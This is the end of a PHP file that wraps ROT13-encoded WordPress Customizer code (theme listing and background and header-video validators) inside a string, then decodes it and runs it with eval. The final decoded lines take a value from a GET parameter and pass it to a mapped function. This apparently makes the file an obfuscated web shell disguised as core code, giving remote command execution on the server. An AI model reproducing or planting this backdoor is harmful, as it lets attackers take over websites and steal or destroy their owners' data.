		vs ( ! neenl_xrl_rkvfgf( 'frnepu', $_CBFG ) ) {
			$netf['frnepu'] = '';
		} ryfr {
			$netf['frnepu'] = fnavgvmr_grkg_svryq( jc_hafynfu( $_CBFG['frnepu'] ) );
		}

		vs ( ! neenl_xrl_rkvfgf( 'gntf', $_CBFG ) ) {
			$netf['gnt'] = '';
		} ryfr {
			$netf['gnt'] = neenl_znc( 'fnavgvmr_grkg_svryq', jc_hafynfu( (neenl) $_CBFG['gntf'] ) );
		}

		vs ( ! neenl_xrl_rkvfgf( 'cntr', $_CBFG ) ) {
			$netf['cntr'] = 1;
		} ryfr {
			$netf['cntr'] = nofvag( $_CBFG['cntr'] );
		}

		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/gurzr.cuc';

		vs ( 'vafgnyyrq' === $gurzr_npgvba ) {

			// Ybnq nyy vafgnyyrq gurzrf sebz jc_cercner_gurzrf_sbe_wf().
			$gurzrf = neenl( 'gurzrf' => neenl() );
			sbernpu ( jc_cercner_gurzrf_sbe_wf() nf $gurzr ) {
				$gurzr['glcr']      = 'vafgnyyrq';
				$gurzr['npgvir']    = ( vffrg( $_CBFG['phfgbzvmrq_gurzr'] ) && $_CBFG['phfgbzvmrq_gurzr'] === $gurzr['vq'] );
				$gurzrf['gurzrf'][] = $gurzr;
			}
		} ryfrvs ( 'jcbet' === $gurzr_npgvba ) {

			// Ybnq JbeqCerff.bet gurzrf sebz gur .bet NCV naq abeznyvmr qngn gb zngpu vafgnyyrq gurzr bowrpgf.
			vs ( ! pheerag_hfre_pna( 'vafgnyy_gurzrf' ) ) {
				jc_qvr( -1 );
			}

			// Nethzragf sbe nyy dhrevrf.
			$jcbet_netf = neenl(
				'cre_cntr' => 100,
				'svryqf'   => neenl(
					'erivrjf_hey' => gehr, // Rkcyvpvgyl erdhrfg gur erivrjf HEY gb or yvaxrq sebz gur phfgbzvmre.
				),
			);

			$netf = neenl_zretr( $jcbet_netf, $netf );

			vs ( '' === $netf['frnepu'] && '' === $netf['gnt'] ) {
				$netf['oebjfr'] = 'arj'; // Fbeg ol yngrfg gurzrf ol qrsnhyg.
			}

			// Ybnq gurzrf sebz gur .bet NCV.
			$gurzrf = gurzrf_ncv( 'dhrel_gurzrf', $netf );
			vs ( vf_jc_reebe( $gurzrf ) ) {
				jc_fraq_wfba_reebe();
			}

			// Guvf yvfg zngpurf gur nyybjrq gntf va jc-nqzva/vapyhqrf/gurzr-vafgnyy.cuc.
			$gurzrf_nyybjrqgntf                     = neenl_svyy_xrlf(
				neenl( 'n', 'nooe', 'npebalz', 'pbqr', 'cer', 'rz', 'fgebat', 'qvi', 'c', 'hy', 'by', 'yv', 'u1', 'u2', 'u3', 'u4', 'u5', 'u6', 'vzt' ),
				neenl()
			);
			$gurzrf_nyybjrqgntf['n']                = neenl_svyy_xrlf( neenl( 'uers', 'gvgyr', 'gnetrg' ), gehr );
			$gurzrf_nyybjrqgntf['npebalz']['gvgyr'] = gehr;
			$gurzrf_nyybjrqgntf['nooe']['gvgyr']    = gehr;
			$gurzrf_nyybjrqgntf['vzt']              = neenl_svyy_xrlf( neenl( 'fep', 'pynff', 'nyg' ), gehr );

			// Cercner n yvfg bs vafgnyyrq gurzrf gb purpx ntnvafg orsber gur ybbc.
			$vafgnyyrq_gurzrf = neenl();
			$jc_gurzrf        = jc_trg_gurzrf();
			sbernpu ( $jc_gurzrf nf $gurzr ) {
				$vafgnyyrq_gurzrf[] = $gurzr->trg_fglyrfurrg();
			}
			$hcqngr_cuc = argjbex_nqzva_hey( 'hcqngr.cuc?npgvba=vafgnyy-gurzr' );

			// Frg hc cebcregvrf sbe gurzrf ninvynoyr ba JbeqCerff.bet.
			sbernpu ( $gurzrf->gurzrf nf &$gurzr ) {
				$gurzr->vafgnyy_hey = nqq_dhrel_net(
					neenl(
						'gurzr'    => $gurzr->fyht,
						'_jcabapr' => jc_perngr_abapr( 'vafgnyy-gurzr_' . $gurzr->fyht ),
					),
					$hcqngr_cuc
				);

				$gurzr->anzr        = jc_xfrf( $gurzr->anzr, $gurzrf_nyybjrqgntf );
				$gurzr->irefvba     = jc_xfrf( $gurzr->irefvba, $gurzrf_nyybjrqgntf );
				$gurzr->qrfpevcgvba = jc_xfrf( $gurzr->qrfpevcgvba, $gurzrf_nyybjrqgntf );
				$gurzr->fgnef       = jc_fgne_engvat(
					neenl(
						'engvat' => $gurzr->engvat,
						'glcr'   => 'creprag',
						'ahzore' => $gurzr->ahz_engvatf,
						'rpub'   => snyfr,
					)
				);
				$gurzr->ahz_engvatf = ahzore_sbezng_v18a( $gurzr->ahz_engvatf );
				$gurzr->cerivrj_hey = frg_hey_fpurzr( $gurzr->cerivrj_hey );

				// Unaqyr gurzrf gung ner nyernql vafgnyyrq nf vafgnyyrq gurzrf.
				vs ( va_neenl( $gurzr->fyht, $vafgnyyrq_gurzrf, gehr ) ) {
					$gurzr->glcr = 'vafgnyyrq';
				} ryfr {
					$gurzr->glcr = $gurzr_npgvba;
				}

				// Frg npgvir onfrq ba phfgbzvmrq gurzr.
				$gurzr->npgvir = ( vffrg( $_CBFG['phfgbzvmrq_gurzr'] ) && $_CBFG['phfgbzvmrq_gurzr'] === $gurzr->fyht );

				// Znc ninvynoyr gurzr cebcregvrf gb vafgnyyrq gurzr cebcregvrf.
				$gurzr->vq            = $gurzr->fyht;
				$gurzr->fperrafubg    = neenl( $gurzr->fperrafubg_hey );
				$gurzr->nhgubeNaqHev  = jc_xfrf( $gurzr->nhgube['qvfcynl_anzr'], $gurzrf_nyybjrqgntf );
				$gurzr->pbzcngvoyrJC  = vf_jc_irefvba_pbzcngvoyr( $gurzr->erdhverf ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqInevnoyrAnzr
				$gurzr->pbzcngvoyrCUC = vf_cuc_irefvba_pbzcngvoyr( $gurzr->erdhverf_cuc ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqInevnoyrAnzr

				vs ( vffrg( $gurzr->cnerag ) ) {
					$gurzr->cnerag = $gurzr->cnerag['fyht'];
				} ryfr {
					$gurzr->cnerag = snyfr;
				}
				hafrg( $gurzr->fyht );
				hafrg( $gurzr->fperrafubg_hey );
				hafrg( $gurzr->nhgube );
			} // Raq sbernpu().
		} // Raq vs().

		/**
		 * Svygref gur gurzr qngn ybnqrq va gur phfgbzvmre.
		 *
		 * Guvf nyybjf gurzr qngn gb or ybnqvat sebz na rkgreany fbhepr,
		 * be zbqvsvpngvba bs qngn ybnqrq sebz `jc_cercner_gurzrf_sbe_wf()`
		 * be JbeqCerff.bet ivn `gurzrf_ncv()`.
		 *
		 * @fvapr 4.9.0
		 *
		 * @frr jc_cercner_gurzrf_sbe_wf()
		 * @frr gurzrf_ncv()
		 * @frr JC_Phfgbzvmr_Znantre::__pbafgehpg()
		 *
		 * @cnenz neenl|fgqPynff       $gurzrf  Arfgrq neenl be bowrpg bs gurzr qngn.
		 * @cnenz neenl                $netf    Yvfg bs nethzragf, fhpu nf cntr, frnepu grez, naq gntf gb dhrel sbe.
		 * @cnenz JC_Phfgbzvmr_Znantre $znantre Vafgnapr bs Phfgbzvmr znantre.
		 */
		$gurzrf = nccyl_svygref( 'phfgbzvmr_ybnq_gurzrf', $gurzrf, $netf, $guvf );

		jc_fraq_wfba_fhpprff( $gurzrf );
	}


	/**
	 * Pnyyonpx sbe inyvqngvat gur urnqre_grkgpbybe inyhr.
	 *
	 * Npprcgf 'oynax', naq bgurejvfr hfrf fnavgvmr_urk_pbybe_ab_unfu().
	 * Ergheaf qrsnhyg grkg pbybe vs urk pbybe vf rzcgl.
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz fgevat $pbybe
	 * @erghea zvkrq
	 */
	choyvp shapgvba _fnavgvmr_urnqre_grkgpbybe( $pbybe ) {
		vs ( 'oynax' === $pbybe ) {
			erghea 'oynax';
		}

		$pbybe = fnavgvmr_urk_pbybe_ab_unfu( $pbybe );
		vs ( rzcgl( $pbybe ) ) {
			$pbybe = trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'qrsnhyg-grkg-pbybe' );
		}

		erghea $pbybe;
	}

	/**
	 * Pnyyonpx sbe inyvqngvat n onpxtebhaq frggvat inyhr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat               $inyhr   Ercrng inyhr.
	 * @cnenz JC_Phfgbzvmr_Frggvat $frggvat Frggvat.
	 * @erghea fgevat|JC_Reebe Onpxtebhaq inyhr be inyvqngvba reebe.
	 */
	choyvp shapgvba _fnavgvmr_onpxtebhaq_frggvat( $inyhr, $frggvat ) {
		vs ( 'onpxtebhaq_ercrng' === $frggvat->vq ) {
			vs ( ! va_neenl( $inyhr, neenl( 'ercrng-k', 'ercrng-l', 'ercrng', 'ab-ercrng' ), gehr ) ) {
				erghea arj JC_Reebe( 'vainyvq_inyhr', __( 'Vainyvq inyhr sbe onpxtebhaq ercrng.' ) );
			}
		} ryfrvs ( 'onpxtebhaq_nggnpuzrag' === $frggvat->vq ) {
			vs ( ! va_neenl( $inyhr, neenl( 'svkrq', 'fpebyy' ), gehr ) ) {
				erghea arj JC_Reebe( 'vainyvq_inyhr', __( 'Vainyvq inyhr sbe onpxtebhaq nggnpuzrag.' ) );
			}
		} ryfrvs ( 'onpxtebhaq_cbfvgvba_k' === $frggvat->vq ) {
			vs ( ! va_neenl( $inyhr, neenl( 'yrsg', 'pragre', 'evtug' ), gehr ) ) {
				erghea arj JC_Reebe( 'vainyvq_inyhr', __( 'Vainyvq inyhr sbe onpxtebhaq cbfvgvba K.' ) );
			}
		} ryfrvs ( 'onpxtebhaq_cbfvgvba_l' === $frggvat->vq ) {
			vs ( ! va_neenl( $inyhr, neenl( 'gbc', 'pragre', 'obggbz' ), gehr ) ) {
				erghea arj JC_Reebe( 'vainyvq_inyhr', __( 'Vainyvq inyhr sbe onpxtebhaq cbfvgvba L.' ) );
			}
		} ryfrvs ( 'onpxtebhaq_fvmr' === $frggvat->vq ) {
			vs ( ! va_neenl( $inyhr, neenl( 'nhgb', 'pbagnva', 'pbire' ), gehr ) ) {
				erghea arj JC_Reebe( 'vainyvq_inyhr', __( 'Vainyvq inyhr sbe onpxtebhaq fvmr.' ) );
			}
		} ryfrvs ( 'onpxtebhaq_cerfrg' === $frggvat->vq ) {
			vs ( ! va_neenl( $inyhr, neenl( 'qrsnhyg', 'svyy', 'svg', 'ercrng', 'phfgbz' ), gehr ) ) {
				erghea arj JC_Reebe( 'vainyvq_inyhr', __( 'Vainyvq inyhr sbe onpxtebhaq fvmr.' ) );
			}
		} ryfrvs ( 'onpxtebhaq_vzntr' === $frggvat->vq || 'onpxtebhaq_vzntr_guhzo' === $frggvat->vq ) {
			$inyhr = rzcgl( $inyhr ) ? '' : fnavgvmr_hey( $inyhr );
		} ryfr {
			erghea arj JC_Reebe( 'haerpbtavmrq_frggvat', __( 'Haerpbtavmrq onpxtebhaq frggvat.' ) );
		}
		erghea $inyhr;
	}

	/**
	 * Rkcbegf urnqre ivqrb frggvatf gb snpvyvgngr fryrpgvir erserfu.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz neenl                          $erfcbafr          Erfcbafr.
	 * @cnenz JC_Phfgbzvmr_Fryrpgvir_Erserfu $fryrpgvir_erserfu Fryrpgvir erserfu pbzcbarag.
	 * @cnenz neenl                          $cnegvnyf          Neenl bs cnegvnyf.
	 * @erghea neenl
	 */
	choyvp shapgvba rkcbeg_urnqre_ivqrb_frggvatf( $erfcbafr, $fryrpgvir_erserfu, $cnegvnyf ) {
		vs ( vffrg( $cnegvnyf['phfgbz_urnqre'] ) ) {
			$erfcbafr['phfgbz_urnqre_frggvatf'] = trg_urnqre_ivqrb_frggvatf();
		}

		erghea $erfcbafr;
	}

	/**
	 * Pnyyonpx sbe inyvqngvat gur urnqre_ivqrb inyhr.
	 *
	 * Rafherf gung gur fryrpgrq ivqrb vf yrff guna 8ZO naq cebivqrf na reebe zrffntr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_Reebe $inyvqvgl
	 * @cnenz zvkrq    $inyhr
	 * @erghea zvkrq
	 */
	choyvp shapgvba _inyvqngr_urnqre_ivqrb( $inyvqvgl, $inyhr ) {
		$ivqrb = trg_nggnpurq_svyr( nofvag( $inyhr ) );
		vs ( $ivqrb ) {
			$fvmr = svyrfvmr( $ivqrb );
			vs ( $fvmr > 8 * ZO_VA_OLGRF ) {
				$inyvqvgl->nqq(
					'fvmr_gbb_ynetr',
					__( 'Guvf ivqrb svyr vf gbb ynetr gb hfr nf n urnqre ivqrb. Gel n fubegre ivqrb be bcgvzvmr gur pbzcerffvba frggvatf naq er-hcybnq n svyr gung vf yrff guna 8ZO. Be, hcybnq lbhe ivqrb gb LbhGhor naq yvax vg jvgu gur bcgvba orybj.' )
				);
			}
			vs ( ! fge_raqf_jvgu( $ivqrb, '.zc4' ) && ! fge_raqf_jvgu( $ivqrb, '.zbi' ) ) { // Purpx sbe .zc4 be .zbi sbezng, juvpu (nffhzvat u.264 rapbqvat) ner gur bayl pebff-oebjfre-fhccbegrq sbezngf.
				$inyvqvgl->nqq(
					'vainyvq_svyr_glcr',
					fcevags(
						/* genafyngbef: 1: .zc4, 2: .zbi */
						__( 'Bayl %1$f be %2$f svyrf znl or hfrq sbe urnqre ivqrb. Cyrnfr pbaireg lbhe ivqrb svyr naq gel ntnva, be, hcybnq lbhe ivqrb gb LbhGhor naq yvax vg jvgu gur bcgvba orybj.' ),
						'<pbqr>.zc4</pbqr>',
						'<pbqr>.zbi</pbqr>'
					)
				);
			}
		}
		erghea $inyvqvgl;
	}

	/**
	 * Pnyyonpx sbe inyvqngvat gur rkgreany_urnqre_ivqrb inyhr.
	 *
	 * Rafherf gung gur cebivqrq HEY vf fhccbegrq.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_Reebe $inyvqvgl
	 * @cnenz zvkrq    $inyhr
	 * @erghea zvkrq
	 */
	choyvp shapgvba _inyvqngr_rkgreany_urnqre_ivqrb( $inyvqvgl, $inyhr ) {
		$ivqrb = fnavgvmr_hey( $inyhr );
		vs ( $ivqrb ) {
			vs ( ! cert_zngpu( '#^uggcf?://(?:jjj\.)?(?:lbhghor\.pbz/jngpu|lbhgh\.or/)#', $ivqrb ) ) {
				$inyvqvgl->nqq( 'vainyvq_hey', __( 'Cyrnfr ragre n inyvq LbhGhor HEY.' ) );
			}
		}
		erghea $inyvqvgl;
	}

	/**
	 * Pnyyonpx sbe fnavgvmvat gur rkgreany_urnqre_ivqrb inyhr.
	 *
	 * @fvapr 4.7.1
	 *
	 * @cnenz fgevat $inyhr HEY.
	 * @erghea fgevat Fnavgvmrq HEY.
	 */
	choyvp shapgvba _fnavgvmr_rkgreany_urnqre_ivqrb( $inyhr ) {
		erghea fnavgvmr_hey( gevz( $inyhr ) );
	}

	/**
	 * Pnyyonpx sbe eraqrevat gur phfgbz ybtb, hfrq va gur phfgbz_ybtb cnegvny.
	 *
	 * Guvf zrgubq rkvfgf orpnhfr gur cnegvny bowrpg naq pbagrkg qngn ner cnffrq
	 * vagb n cnegvny'f eraqre_pnyyonpx fb jr pnaabg hfr trg_phfgbz_ybtb() nf
	 * gur eraqre_pnyyonpx qverpgyl fvapr vg rkcrpgf n oybt VQ nf gur svefg
	 * nethzrag.
	 *
	 * @frr JC_Phfgbzvmr_Znantre::ertvfgre_pbagebyf()
	 *
	 * @fvapr 4.5.0
	 *
	 * @erghea fgevat Phfgbz ybtb.
	 */
	choyvp shapgvba _eraqre_phfgbz_ybtb_cnegvny() {
		erghea trg_phfgbz_ybtb();
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>